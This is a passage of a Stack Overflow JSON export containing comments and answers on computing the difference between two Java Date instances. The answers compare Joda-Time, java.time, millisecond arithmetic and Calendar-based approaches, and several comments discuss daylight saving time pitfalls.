href=\"http://stackoverflow.com/a/10650881/82609\">stackoverflow.com/a/10650881/82609</a>"},{"owner":{"account_id":1967071,"reputation":1336,"user_id":1767021,"accept_rate":76,"display_name":"deldev"},"score":0,"creation_date":1406138094,"post_id":1555262,"comment_id":38715460,"body_markdown":"try this: http://www.mkyong.com/java/how-to-calculate-date-time-difference-in-java/","body":"try this: <a href=\"http://www.mkyong.com/java/how-to-calculate-date-time-difference-in-java/\" rel=\"nofollow noreferrer\">mkyong.com/java/how-to-calculate-date-time-difference-in-jav&zwnj;&#8203;a</a>"},{"owner":{"account_id":5390835,"reputation":4928,"user_id":4293417,"accept_rate":92,"display_name":"Zizouz212"},"score":8,"creation_date":1451486943,"post_id":1555262,"comment_id":56804772,"body_markdown":"Shame on all those who recommend Joda time, and don&#39;t recommending a true Java answer...","body":"Shame on all those who recommend Joda time, and don&#39;t recommending a true Java answer..."},{"owner":{"account_id":35628,"reputation":26827,"user_id":100970,"display_name":"Ceki"},"score":0,"creation_date":1458297160,"post_id":1555262,"comment_id":59808449,"body_markdown":"For most of the solutions outlined here and elsewhere, they are inaccurate when Daylight savings time (DST) is taken into account. Indeed, when 24 hours are added to Saturday 2016-03-26T23:30 CET, the resulting date is  2016-03-28T00:30 CET and two day frontiers are crossed, Indeed, DST goes into effect on Sunday 2016-03-27T02:00 Central European Time. The DST issue is not specific to CET and occurs each tme the period being considered contains DST going into effect.","body":"For most of the solutions outlined here and elsewhere, they are inaccurate when Daylight savings time (DST) is taken into account. Indeed, when 24 hours are added to Saturday 2016-03-26T23:30 CET, the resulting date is  2016-03-28T00:30 CET and two day frontiers are crossed, Indeed, DST goes into effect on Sunday 2016-03-27T02:00 Central European Time. The DST issue is not specific to CET and occurs each tme the period being considered contains DST going into effect."},{"owner":{"account_id":322981,"reputation":310745,"user_id":642706,"accept_rate":58,"display_name":"Basil Bourque"},"score":5,"creation_date":1477510996,"post_id":1555262,"comment_id":67801732,"body_markdown":"@Zizouz212 Regarding recommending Joda-Time, the old date-time classes bundled with Java are bad, real bad, poorly-designed, confusing, and troublesome. So bad that Joda-Time became hugely successful as their replacement. So bad that even Sun/Oracle gave up on them, and adopted the java.time package as part of Java 8 and later. The java.time classes are inspired by Joda-Time. Both Joda-Time and java.time are led by the same man, [Stephen Colbourne](http://stackoverflow.com/users/38896/jodastephen). I would say, “Shame on anyone recommending use of `Date`, `Calendar`, and `SimpleDateFormat`”.","body":"@Zizouz212 Regarding recommending Joda-Time, the old date-time classes bundled with Java are bad, real bad, poorly-designed, confusing, and troublesome. So bad that Joda-Time became hugely successful as their replacement. So bad that even Sun/Oracle gave up on them, and adopted the java.time package as part of Java 8 and later. The java.time classes are inspired by Joda-Time. Both Joda-Time and java.time are led by the same man, <a href=\"http://stackoverflow.com/users/38896/jodastephen\">Stephen Colbourne</a>. I would say, “Shame on anyone recommending use of <code>Date</code>, <code>Calendar</code>, and <code>SimpleDateFormat</code>”."},{"owner":{"account_id":7196907,"reputation":1682,"user_id":5495432,"accept_rate":80,"display_name":"pl&#225;tano plomo"},"score":0,"creation_date":1478906262,"post_id":1555262,"comment_id":68353321,"body_markdown":"@BasilBourque OP asked for a &quot;simpler, nicer way to get a time delta&quot;; a quick, two line diff seems simpler/nicer than requiring an external dependency.","body":"@BasilBourque OP asked for a &quot;simpler, nicer way to get a time delta&quot;; a quick, two line diff seems simpler/nicer than requiring an external dependency."},{"owner":{"account_id":7612423,"reputation":82486,"user_id":5772882,"display_name":"Anonymous"},"score":4,"creation_date":1487234764,"post_id":1555262,"comment_id":71694037,"body_markdown":"While Joda Time was probably a good answer when the question was asked, today the best answer for anyone who can use Java 8 is to use `java.time.Period` and/or `Duration`. See [Basil Bourque’s answer below](http://stackoverflow.com/a/22588328/5772882).","body":"While Joda Time was probably a good answer when the question was asked, today the best answer for anyone who can use Java 8 is to use <code>java.time.Period</code> and/or <code>Duration</code>. See <a href=\"http://stackoverflow.com/a/22588328/5772882\">Basil Bourque’s answer below</a>."},{"owner":{"account_id":7612423,"reputation":82486,"user_id":5772882,"display_name":"Anonymous"},"score":1,"creation_date":1491994622,"post_id":1555262,"comment_id":73796863,"body_markdown":"You may also look at [Calculate days between two dates in Java 8](http://stackoverflow.com/questions/27005861/calculate-days-between-two-dates-in-java-8). And still avoid any external dependency.","body":"You may also look at <a href=\"http://stackoverflow.com/questions/27005861/calculate-days-between-two-dates-in-java-8\">Calculate days between two dates in Java 8</a>. And still avoid any external dependency."}],"answers":[{"tags":[],"owner":{"account_id":23503,"reputation":28545,"user_id":58956,"accept_rate":91,"display_name":"gustafc"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1255362410,"creation_date":1255362107,"answer_id":1555296,"question_id":1555262,"body_markdown":"Not using the standard API, no. You can roll your own doing something like this:\r\n\r\n    class Duration {\r\n        private final TimeUnit unit;\r\n        private final long length;\r\n        // ...\r\n    }\r\n\r\nOr you can use [Joda][1]:\r\n\r\n    DateTime a = ..., b = ...;\r\n    Duration d = new Duration(a, b);\r\n\r\n  [1]: http://joda-time.sourceforge.net/","title":"Calculating the difference between two Java date instances","body":"<p>Not using the standard API, no. You can roll your own doing something like this:</p>\n\n<pre><code>class Duration {\n    private final TimeUnit unit;\n    private final long length;\n    // ...\n}\n</code></pre>\n\n<p>Or you can use <a href=\"http://joda-time.sourceforge.net/\" rel=\"nofollow noreferrer\">Joda</a>:</p>\n\n<pre><code>DateTime a = ..., b = ...;\nDuration d = new Duration(a, b);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":43112,"reputation":58953,"user_id":125844,"accept_rate":85,"display_name":"notnoop"},"down_vote_count":11,"up_vote_count":226,"is_accepted":true,"score":215,"last_activity_date":1549361230,"creation_date":1255362201,"answer_id":1555307,"question_id":1555262,"body_markdown":"The JDK `Date` API is horribly broken unfortunately.  I recommend using [Joda Time library](https://www.joda.org/joda-time/).\r\n\r\nJoda Time has a concept of time [Interval](https://www.joda.org/joda-time/key_interval.html):\r\n\r\n    Interval interval = new Interval(oldTime, new Instant());\r\n\r\nEDIT: By the way, Joda has two concepts: `Interval` for representing an interval of time between two time instants (represent time between 8am and 10am), and a `Duration` that represents a length of time without the actual time boundaries (e.g. represent two hours!)\r\n\r\nIf you only care about time comparisions, most `Date` implementations (including the JDK one) implements `Comparable` interface which allows you to use the [`Comparable.compareTo()`](http://java.sun.com/javase/6/docs/api/java/lang/Comparable.html#compareTo(T))","title":"Calculating the difference between two Java date instances","body":"<p>The JDK <code>Date</code> API is horribly broken unfortunately.  I recommend using <a href=\"https://www.joda.org/joda-time/\" rel=\"noreferrer\">Joda Time library</a>.</p>\n\n<p>Joda Time has a concept of time <a href=\"https://www.joda.org/joda-time/key_interval.html\" rel=\"noreferrer\">Interval</a>:</p>\n\n<pre><code>Interval interval = new Interval(oldTime, new Instant());\n</code></pre>\n\n<p>EDIT: By the way, Joda has two concepts: <code>Interval</code> for representing an interval of time between two time instants (represent time between 8am and 10am), and a <code>Duration</code> that represents a length of time without the actual time boundaries (e.g. represent two hours!)</p>\n\n<p>If you only care about time comparisions, most <code>Date</code> implementations (including the JDK one) implements <code>Comparable</code> interface which allows you to use the <a href=\"http://java.sun.com/javase/6/docs/api/java/lang/Comparable.html#compareTo(T)\" rel=\"noreferrer\"><code>Comparable.compareTo()</code></a></p>\n"},{"tags":[],"owner":{"account_id":34019,"reputation":14592,"user_id":95699,"accept_rate":73,"display_name":"Rob H"},"down_vote_count":0,"up_vote_count":8,"is_accepted":false,"score":8,"last_activity_date":1549361548,"creation_date":1255362210,"answer_id":1555309,"question_id":1555262,"body_markdown":"Take a look at [Joda Time][1], which is an improved Date/Time API for Java and should work fine with Scala.\r\n\r\n\r\n  [1]: https://www.joda.org/joda-time/","title":"Calculating the difference between two Java date instances","body":"<p>Take a look at <a href=\"https://www.joda.org/joda-time/\" rel=\"nofollow noreferrer\">Joda Time</a>, which is an improved Date/Time API for Java and should work fine with Scala.</p>\n"},{"tags":[],"owner":{"account_id":19462,"reputation":102762,"user_id":45664,"accept_rate":91,"display_name":"Andrzej Doyle"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1255362260,"creation_date":1255362260,"answer_id":1555312,"question_id":1555262,"body_markdown":"That&#39;s probably the most straightforward way to do it - perhaps it&#39;s because I&#39;ve been coding in Java (with its admittedly clunky date and time libraries) for a while now, but that code looks &quot;simple and nice&quot; to me!\r\n\r\nAre you happy with the result being returned in milliseconds, or is part of your question that you would prefer to have it returned in some alternative format?","title":"Calculating the difference between two Java date instances","body":"<p>That's probably the most straightforward way to do it - perhaps it's because I've been coding in Java (with its admittedly clunky date and time libraries) for a while now, but that code looks \"simple and nice\" to me!</p>\n\n<p>Are you happy with the result being returned in milliseconds, or is part of your question that you would prefer to have it returned in some alternative format?</p>\n"},{"tags":[],"owner":{"account_id":9193,"reputation":343113,"user_id":16883,"accept_rate":83,"display_name":"Michael Borgwardt"},"down_vote_count":1,"up_vote_count":25,"is_accepted":false,"score":24,"last_activity_date":1255362683,"creation_date":1255362683,"answer_id":1555349,"question_id":1555262,"body_markdown":"A slightly simpler alternative: \r\n\r\n    System.currentTimeMillis() - oldDate.getTime()\r\n\r\nAs for &quot;nicer&quot;: well, what exactly do you need? The problem with representing time durations as a number of hours and days etc. is that it may lead to inaccuracies and wrong expectations due to the complexity of dates (e.g. days can have 23 or 25 hours due to daylight savings time).","title":"Calculating the difference between two Java date instances","body":"<p>A slightly simpler alternative: </p>\n\n<pre><code>System.currentTimeMillis() - oldDate.getTime()\n</code></pre>\n\n<p>As for \"nicer\": well, what exactly do you need? The problem with representing time durations as a number of hours and days etc. is that it may lead to inaccuracies and wrong expectations due to the complexity of dates (e.g. days can have 23 or 25 hours due to daylight savings time).</p>\n"},{"tags":[],"owner":{"account_id":11683,"reputation":1438179,"user_id":22656,"accept_rate":86,"display_name":"Jon Skeet"},"down_vote_count":0,"up_vote_count":54,"is_accepted":false,"score":54,"last_activity_date":1281948478,"creation_date":1281948478,"answer_id":3491711,"question_id":1555262,"body_markdown":"You need to define your problem more clearly. You *could* just take the number of milliseconds between the two `Date` objects and divide by the number of milliseconds in 24 hours, for example... but:\r\n\r\n- This won&#39;t take time zones into consideration - `Date` is always in UTC\r\n- This won&#39;t take daylight saving time into consideration (where there can be days which are only 23 hours long, for example)\r\n- Even within UTC, how many days are there in August 16th 11pm to August 18th 2am? It&#39;s only 27 hours, so does that mean one day? Or should it be three days because it covers three dates?","title":"Calculating the difference between two Java date instances","body":"<p>You need to define your problem more clearly. You <em>could</em> just take the number of milliseconds between the two <code>Date</code> objects and divide by the number of milliseconds in 24 hours, for example... but:</p>\n\n<ul>\n<li>This won't take time zones into consideration - <code>Date</code> is always in UTC</li>\n<li>This won't take daylight saving time into consideration (where there can be days which are only 23 hours long, for example)</li>\n<li>Even within UTC, how many days are there in August 16th 11pm to August 18th 2am? It's only 27 hours, so does that mean one day? Or should it be three days because it covers three dates?</li>\n</ul>\n"},{"tags":[],"owner":{"account_id":27166,"reputation":19089,"user_id":71399,"accept_rate":65,"display_name":"pauljwilliams"},"down_vote_count":5,"up_vote_count":5,"is_accepted":false,"score":0,"last_activity_date":1281948480,"creation_date":1281948480,"answer_id":3491712,"question_id":1555262,"body_markdown":"Just call getTime on each, take the difference, and divide by the number of milliseconds in a day.","title":"Calculating the difference between two Java date instances","body":"<p>Just call getTime on each, take the difference, and divide by the number of milliseconds in a day.</p>\n"},{"tags":[],"owner":{"account_id":70258,"reputation":590444,"user_id":203907,"accept_rate":81,"display_name":"Bozho"},"down_vote_count":2,"up_vote_count":7,"is_accepted":false,"score":5,"last_activity_date":1281948498,"creation_date":1281948498,"answer_id":3491715,"question_id":1555262,"body_markdown":"    int daysDiff = (date1.getTime() - date2.getTime()) / MILLIS_PER_DAY;","title":"Calculating the difference between two Java date instances","body":"<pre><code>int daysDiff = (date1.getTime() - date2.getTime()) / MILLIS_PER_DAY;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":151586,"reputation":1981,"user_id":365568,"accept_rate":83,"display_name":"codersarepeople"},"down_vote_count":5,"up_vote_count":2,"is_accepted":false,"score":-3,"last_activity_date":1281948500,"creation_date":1281948500,"answer_id":3491716,"question_id":1555262,"body_markdown":"If you have d1 and d2 as your dates, the best solution is probably the following:\r\n\r\n    int days1 = d1.getTime()/(60*60*24*1000);//find the number of days since the epoch.\r\n    int days2 = d2.getTime()/(60*60*24*1000);\r\n\r\nthen just say\r\n\r\n    days2-days1\r\n\r\nor whatever\r\n","title":"Calculating the difference between two Java date instances","body":"<p>If you have d1 and d2 as your dates, the best solution is probably the following:</p>\n\n<pre><code>int days1 = d1.getTime()/(60*60*24*1000);//find the number of days since the epoch.\nint days2 = d2.getTime()/(60*60*24*1000);\n</code></pre>\n\n<p>then just say</p>\n\n<pre><code>days2-days1\n</code></pre>\n\n<p>or whatever</p>\n"},{"tags":[],"owner":{"account_id":165118,"reputation":14339,"user_id":388299,"accept_rate":77,"display_name":"YoK"},"down_vote_count":3,"up_vote_count":7,"is_accepted":false,"score":4,"last_activity_date":1281949262,"creation_date":1281948528,"answer_id":3491720,"question_id":1555262,"body_markdown":"Check example here http://www.roseindia.net/java/beginners/DateDifferent.shtml\r\nThis example give you difference in days, hours, minutes, secs and milli sec&#39;s :).\r\n\r\n    import java.util.Calendar;\r\n    import java.util.Date;\r\n    \r\n    public class DateDifferent {\r\n    \tpublic static void main(String[] args) {\r\n    \t\tDate date1 = new Date(2009, 01, 10);\r\n    \t\tDate date2 = new Date(2009, 07, 01);\r\n    \t\tCalendar calendar1 = Calendar.getInstance();\r\n    \t\tCalendar calendar2 = Calendar.getInstance();\r\n    \t\tcalendar1.setTime(date1);\r\n    \t\tcalendar2.setTime(date2);\r\n    \t\tlong milliseconds1 = calendar1.getTimeInMillis();\r\n    \t\tlong milliseconds2 = calendar2.getTimeInMillis();\r\n    \t\tlong diff = milliseconds2 - milliseconds1;\r\n    \t\tlong diffSeconds = diff / 1000;\r\n    \t\tlong diffMinutes = diff / (60 * 1000);\r\n    \t\tlong diffHours = diff / (60 * 60 * 1000);\r\n    \t\tlong diffDays = diff / (24 * 60 * 60 * 1000);\r\n    \t\tSystem.out.println(&quot;\\nThe Date Different Example&quot;);\r\n    \t\tSystem.out.println(&quot;Time in milliseconds: &quot; + diff + &quot; milliseconds.&quot;);\r\n    \t\tSystem.out.println(&quot;Time in seconds: &quot; + diffSeconds + &quot; seconds.&quot;);\r\n    \t\tSystem.out.println(&quot;Time in minutes: &quot; + diffMinutes + &quot; minutes.&quot;);\r\n    \t\tSystem.out.println(&quot;Time in hours: &quot; + diffHours + &quot; hours.&quot;);\r\n    \t\tSystem.out.println(&quot;Time in days: &quot; + diffDays + &quot; days.&quot;);\r\n    \t}\r\n    }","title":"Calculating the difference between two Java date instances","body":"<p>Check example here <a href=\"http://www.roseindia.net/java/beginners/DateDifferent.shtml\" rel=\"noreferrer\">http://www.roseindia.net/java/beginners/DateDifferent.shtml</a>\nThis example give you difference in days, hours, minutes, secs and milli sec's :).</p>\n\n<pre><code>import java.util.Calendar;\nimport java.util.Date;\n\npublic class DateDifferent {\n    public static void main(String[] args) {\n        Date date1 = new Date(2009, 01, 10);\n        Date date2 = new Date(2009, 07, 01);\n        Calendar calendar1 = Calendar.getInstance();\n        Calendar calendar2 = Calendar.getInstance();\n        calendar1.setTime(date1);\n        calendar2.setTime(date2);\n        long milliseconds1 = calendar1.getTimeInMillis();\n        long milliseconds2 = calendar2.getTimeInMillis();\n        long diff = milliseconds2 - milliseconds1;\n        long diffSeconds = diff / 1000;\n        long diffMinutes = diff / (60 * 1000);\n        long diffHours = diff / (60 * 60 * 1000);\n        long diffDays = diff / (24 * 60 * 60 * 1000);\n        System.out.println(\"\\nThe Date Different Example\");\n        System.out.println(\"Time in milliseconds: \" + diff + \" milliseconds.\");\n        System.out.println(\"Time in seconds: \" + diffSeconds + \" seconds.\");\n        System.out.println(\"Time in minutes: \" + diffMinutes + \" minutes.\");\n        System.out.println(\"Time in hours: \" + diffHours + \" hours.\");\n        System.out.println(\"Time in days: \" + diffDays + \" days.\");\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9193,"reputation":343113,"user_id":16883,"accept_rate":83,"display_name":"Michael Borgwardt"},"down_vote_count":5,"up_vote_count":166,"is_accepted":false,"score":161,"last_activity_date":1355321649,"creation_date":1281948576,"answer_id":3491723,"question_id":1555262,"body_markdown":"    int diffInDays = (int)( (newerDate.getTime() - olderDate.getTime()) \r\n                     / (1000 * 60 * 60 * 24) )\r\n\r\nNote that this works with UTC dates, so the difference may be a day off if you look at local dates. And getting it to work correctly with local dates requires a completely different approach due to daylight savings time.","title":"Calculating the difference between two Java date instances","body":"<pre><code>int diffInDays = (int)( (newerDate.getTime() - olderDate.getTime()) \n                 / (1000 * 60 * 60 * 24) )\n</code></pre>\n\n<p>Note that this works with UTC dates, so the difference may be a day off if you look at local dates. And getting it to work correctly with local dates requires a completely different approach due to daylight savings time.</p>\n"},{"tags":[],"owner":{"account_id":18868,"reputation":82004,"user_id":43681,"accept_rate":70,"display_name":"sleske"},"down_vote_count":2,"up_vote_count":11,"is_accepted":false,"score":9,"last_activity_date":1283177636,"creation_date":1283177636,"answer_id":3601138,"question_id":1555262,"body_markdown":"If you don&#39;t want to use JodaTime or similar, the best solution is probably this:\r\n\r\n    final static long MILLIS_PER_DAY = 24 * 3600 * 1000;\r\n    long msDiff= date1.getTime() - date2.getTime();\r\n    long daysDiff = Math.round(msDiff / ((double)MILLIS_PER_DAY));\r\n\r\nThe number of ms per day is not always the same (because of daylight saving time and leap seconds), but it&#39;s very close, and at least deviations due to daylight saving time cancel out over longer periods. Therefore dividing and then rounding will give a correct result (at least as long as the local calendar used does not contain weird time jumps other than DST and leap seconds).\r\n\r\nNote that this still assumes that `date1` and `date2` are set to the same time of day. For different times of day, you&#39;d first have to define what &quot;date difference&quot; means, as pointed out by Jon Skeet.","title":"Calculating the difference between two Java date instances","body":"<p>If you don't want to use JodaTime or similar, the best solution is probably this:</p>\n\n<pre><code>final static long MILLIS_PER_DAY = 24 * 3600 * 1000;\nlong msDiff= date1.getTime() - date2.getTime();\nlong daysDiff = Math.round(msDiff / ((double)MILLIS_PER_DAY));\n</code></pre>\n\n<p>The number of ms per day is not always the same (because of daylight saving time and leap seconds), but it's very close, and at least deviations due to daylight saving time cancel out over longer periods. Therefore dividing and then rounding will give a correct result (at least as long as the local calendar used does not contain weird time jumps other than DST and leap seconds).</p>\n\n<p>Note that this still assumes that <code>date1</code> and <code>date2</code> are set to the same time of day. For different times of day, you'd first have to define what \"date difference\" means, as pointed out by Jon Skeet.</p>\n"},{"tags":[],"owner":{"account_id":260335,"reputation":1114,"user_id":543830,"accept_rate":85,"display_name":"Adriano Bacha"},"down_vote_count":3,"up_vote_count":42,"is_accepted":false,"score":39,"last_activity_date":1549361137,"creation_date":1293568695,"answer_id":4549327,"question_id":1555262,"body_markdown":"    Days d = Days.daysBetween(startDate, endDate);\r\n    int days = d.getDays();\r\n\r\nhttps://www.joda.org/joda-time/faq.html#datediff","title":"Calculating the difference between two Java date instances","body":"<pre><code>Days d = Days.daysBetween(startDate, endDate);\nint days = d.getDays();\n</code></pre>\n\n<p><a href=\"https://www.joda.org/joda-time/faq.html#datediff\" rel=\"noreferrer\">https://www.joda.org/joda-time/faq.html#datediff</a></p>\n"},{"tags":[],"owner":{"account_id":378801,"reputation":2137,"user_id":731775,"accept_rate":38,"display_name":"zasadnyy"},"down_vote_count":2,"up_vote_count":26,"is_accepted":false,"score":24,"last_activity_date":1321867580,"creation_date":1321867580,"answer_id":8209668,"question_id":1555262,"body_markdown":"Using millisecond approach can cause problems in some locales.\r\n\r\nLets take, for example, the difference between the two dates 03/24/2007 and 03/25/2007 should be 1 day; \r\n\r\nHowever, using the millisecond route, you&#39;ll get 0 days, if you run this in the UK! \r\n\r\n    /** Manual Method - YIELDS INCORRECT RESULTS - DO NOT USE**/  \r\n    /* This method is used to find the no of days between the given dates */  \r\n    public long calculateDays(Date dateEarly, Date dateLater) {  \r\n       return (dateLater.getTime() - dateEarly.getTime()) / (24 * 60 * 60 * 1000);  \r\n    } \r\n\r\nBetter way to implement this is to use java.util.Calendar\r\n\r\n    /** Using Calendar - THE CORRECT WAY**/  \r\n    public static long daysBetween(Calendar startDate, Calendar endDate) {  \r\n      Calendar date = (Calendar) startDate.clone();  \r\n      long daysBetween = 0;  \r\n      while (date.before(endDate)) {  \r\n        date.add(Calendar.DAY_OF_MONTH, 1);  \r\n        daysBetween++;  \r\n      }  \r\n      return daysBetween;  \r\n    }  ","title":"Calculating the difference between two Java date instances","body":"<p>Using millisecond approach can cause problems in some locales.</p>\n\n<p>Lets take, for example, the difference between the two dates 03/24/2007 and 03/25/2007 should be 1 day; </p>\n\n<p>However, using the millisecond route, you'll get 0 days, if you run this in the UK! </p>\n\n<pre><code>/** Manual Method - YIELDS INCORRECT RESULTS - DO NOT USE**/  \n/* This method is used to find the no of days between the given dates */  \npublic long calculateDays(Date dateEarly, Date dateLater) {  \n   return (dateLater.getTime() - dateEarly.getTime()) / (24 * 60 * 60 * 1000);  \n} \n</code></pre>\n\n<p>Better way to implement this is to use java.util.Calendar</p>\n\n<pre><code>/** Using Calendar - THE CORRECT WAY**/  \npublic static long daysBetween(Calendar startDate, Calendar endDate) {  \n  Calendar date = (Calendar) startDate.clone();  \n  long daysBetween = 0;  \n  while (date.before(endDate)) {  \n    date.add(Calendar.DAY_OF_MONTH, 1);  \n    daysBetween++;  \n  }  \n  return daysBetween;  \n}  \n</code></pre>\n"},{"tags":[],"owner":{"account_id":1132190,"reputation":41,"user_id":1118030,"display_name":"Michal"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1325006518,"creation_date":1325006518,"answer_id":8647380,"question_id":1555262,"body_markdown":"Use GMT time zone to get an instance of the Calendar, set the time using the set method of Calendar class. The GMT timezone has 0 offset (not really important) and daylight saving time flag set to false.\r\n\r\n\r\n\t\tfinal Calendar cal = Calendar.getInstance(TimeZone.getTimeZone(&quot;GMT&quot;));\r\n\t\t\r\n\t\tcal.set(Calendar.YEAR, 2011);\r\n\t\tcal.set(Calendar.MONTH, 9);\r\n\t\tcal.set(Calendar.DAY_OF_MONTH, 29);\r\n\t\tcal.set(Calendar.HOUR, 0);\r\n\t\tcal.set(Calendar.MINUTE, 0);\r\n\t\tcal.set(Calendar.SECOND, 0);\r\n\t\tfinal Date startDate = cal.getTime();\r\n\t\t\r\n\t\tcal.set(Calendar.YEAR, 2011);\r\n\t\tcal.set(Calendar.MONTH, 12);\r\n\t\tcal.set(Calendar.DAY_OF_MONTH, 21);\r\n\t\tcal.set(Calendar.HOUR, 0);\r\n\t\tcal.set(Calendar.MINUTE, 0);\r\n\t\tcal.set(Calendar.SECOND, 0);\r\n\t\tfinal Date endDate = cal.getTime();\r\n\t\t\r\n\t\tSystem.out.println((endDate.getTime() - startDate.getTime()) % (1000l * 60l * 60l * 24l));\r\n","title":"Calculating the difference between two Java date instances","body":"<p>Use GMT time zone to get an instance of the Calendar, set the time using the set method of Calendar class. The GMT timezone has 0 offset (not really important) and daylight saving time flag set to false.</p>\n\n<pre><code>    final Calendar cal = Calendar.getInstance(TimeZone.getTimeZone(\"GMT\"));\n\n    cal.set(Calendar.YEAR, 2011);\n    cal.set(Calendar.MONTH, 9);\n    cal.set(Calendar.DAY_OF_MONTH, 29);\n    cal.set(Calendar.HOUR, 0);\n    cal.set(Calendar.MINUTE, 0);\n    cal.set(Calendar.SECOND, 0);\n    final Date startDate = cal.getTime();\n\n    cal.set(Calendar.YEAR, 2011);\n    cal.set(Calendar.MONTH, 12);\n    cal.set(Calendar.DAY_OF_MONTH, 21);\n    cal.set(Calendar.HOUR, 0);\n    cal.set(Calendar.MINUTE, 0);\n    cal.set(Calendar.SECOND, 0);\n    final Date endDate = cal.getTime();\n\n    System.out.println((endDate.getTime() - startDate.getTime()) % (1000l * 60l * 60l * 24l));\n</code></pre>\n"},{"tags":[],"owner":{"account_id":342810,"reputation":221,"user_id":674158,"display_name":"user674158"},"down_vote_count":0,"up_vote_count":5,"is_accepted":false,"score":5,"last_activity_date":1328500071,"creation_date":1328500071,"answer_id":9155371,"question_id":1555262,"body_markdown":"Let me show difference between Joda Interval and Days:\r\n\r\n    DateTime start = new DateTime(2012, 2, 6, 10, 44, 51, 0);\r\n    DateTime end = new DateTime(2012, 2, 6, 11, 39, 47, 1);\r\n    Interval interval = new Interval(start, end);\r\n    Period period = interval.toPeriod();\r\n    System.out.println(period.getYears() + &quot; years, &quot; + period.getMonths() + &quot; months, &quot; + period.getWeeks() + &quot; weeks, &quot; + period.getDays() + &quot; days&quot;);\r\n    System.out.println(period.getHours() + &quot; hours, &quot; + period.getMinutes() + &quot; minutes, &quot; + period.getSeconds() + &quot; seconds &quot;);\r\n    //Result is:\r\n    //0 years, 0 months, *1 weeks, 1 days*\r\n    //0 hours, 54 minutes, 56 seconds \r\n    \r\n    //Period can set PeriodType,such as PeriodType.yearMonthDay(),PeriodType.yearDayTime()...\r\n    Period p = new Period(start, end, PeriodType.yearMonthDayTime());\r\n    System.out.println(p.getYears() + &quot; years, &quot; + p.getMonths() + &quot; months, &quot; + p.getWeeks() + &quot; weeks, &quot; + p.getDays() + &quot;days&quot;);\r\n    System.out.println(p.getHours() + &quot; hours, &quot; + p.getMinutes() + &quot; minutes, &quot; + p.getSeconds() + &quot; seconds &quot;);\r\n    //Result is:\r\n    //0 years, 0 months, *0 weeks, 8 days*\r\n    //0 hours, 54 minutes, 56 seconds \r\n\r\n","title":"Calculating the difference between two Java date instances","body":"<p>Let me show difference between Joda Interval and Days:</p>\n\n<pre><code>DateTime start = new DateTime(2012, 2, 6, 10, 44, 51, 0);\nDateTime end = new DateTime(2012, 2, 6, 11, 39, 47, 1);\nInterval interval = new Interval(start, end);\nPeriod period = interval.toPeriod();\nSystem.out.println(period.getYears() + \" years, \" + period.getMonths() + \" months, \" + period.getWeeks() + \" weeks, \" + period.getDays() + \" days\");\nSystem.out.println(period.getHours() + \" hours, \" + period.getMinutes() + \" minutes, \" + period.getSeconds() + \" seconds \");\n//Result is:\n//0 years, 0 months, *1 weeks, 1 days*\n//0 hours, 54 minutes, 56 seconds \n\n//Period can set PeriodType,such as PeriodType.yearMonthDay(),PeriodType.yearDayTime()...\nPeriod p = new Period(start, end, PeriodType.yearMonthDayTime());\nSystem.out.println(p.getYears() + \" years, \" + p.getMonths() + \" months, \" + p.getWeeks() + \" weeks, \" + p.getDays() + \"days\");\nSystem.out.println(p.getHours() + \" hours, \" + p.getMinutes() + \" minutes, \" + p.getSeconds() + \" seconds \");\n//Result is:\n//0 years, 0 months, *0 weeks, 8 days*\n//0 hours, 54 minutes, 56 seconds \n</code></pre>\n"},{"tags":[],"owner":{"account_id":1284185,"reputation":3821,"user_id":1237610,"accept_rate":25,"display_name":"kundan bora"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1332149492,"creation_date":1332149492,"answer_id":9767747,"question_id":1555262,"body_markdown":"The following is one solution, as there are numerous ways we can achieve this:\r\n\r\n      import java.util.*; \r\n       int syear = 2000;\r\n       int eyear = 2000;\r\n       int smonth = 2;//Feb\r\n       int emonth = 3;//Mar\r\n       int sday = 27;\r\n       int eday = 1;\r\n       Date startDate = new Date(syear-1900,smonth-1,sday);\r\n       Date endDate = new Date(eyear-1900,emonth-1,eday);\r\n       int difInDays = (int) ((endDate.getTime() - startDate.getTime())/(1000*60*60*24));","title":"Calculating the difference between two Java date instances","body":"<p>The following is one solution, as there are numerous ways we can achieve this:</p>\n\n<pre><code>  import java.util.*; \n   int syear = 2000;\n   int eyear = 2000;\n   int smonth = 2;//Feb\n   int emonth = 3;//Mar\n   int sday = 27;\n   int eday = 1;\n   Date startDate = new Date(syear-1900,smonth-1,sday);\n   Date endDate = new Date(eyear-1900,emonth-1,eday);\n   int difInDays = (int) ((endDate.getTime() - startDate.getTime())/(1000*60*60*24));\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1299488,"reputation":6269,"user_id":1249710,"display_name":"JDGuide"},"down_vote_count":4,"up_vote_count":27,"is_accepted":false,"score":23,"last_activity_date":1512021582,"creation_date":1333431018,"answer_id":9987575,"question_id":1555262,"body_markdown":"There are many ways you can find the difference between dates &amp; times.  One of the simplest ways that I know of would be:\r\n         \r\n          Calendar calendar1 = Calendar.getInstance();\r\n          Calendar calendar2 = Calendar.getInstance();\r\n          calendar1.set(2012, 04, 02);\r\n          calendar2.set(2012, 04, 04);\r\n          long milsecs1= calendar1.getTimeInMillis();\r\n          long milsecs2 = calendar2.getTimeInMillis();\r\n          long diff = milsecs2 - milsecs1;\r\n          long dsecs = diff / 1000;\r\n          long dminutes = diff / (60 * 1000);\r\n          long dhours = diff / (60 * 60 * 1000);\r\n          long ddays = diff / (24 * 60 * 60 * 1000);\r\n        \r\n          System.out.println(&quot;Your Day Difference=&quot;+ddays);\r\n        \r\n        \r\nThe print statement is just an example - you can format it, the way you like.\r\n","title":"Calculating the difference between two Java date instances","body":"<p>There are many ways you can find the difference between dates &amp; times.  One of the simplest ways that I know of would be:</p>\n\n<pre><code>      Calendar calendar1 = Calendar.getInstance();\n      Calendar calendar2 = Calendar.getInstance();\n      calendar1.set(2012, 04, 02);\n      calendar2.set(2012, 04, 04);\n      long milsecs1= calendar1.getTimeInMillis();\n      long milsecs2 = calendar2.getTimeInMillis();\n      long diff = milsecs2 - milsecs1;\n      long dsecs = diff / 1000;\n      long dminutes = diff / (60 * 1000);\n      long dhours = diff / (60 * 60 * 1000);\n      long ddays = diff / (24 * 60 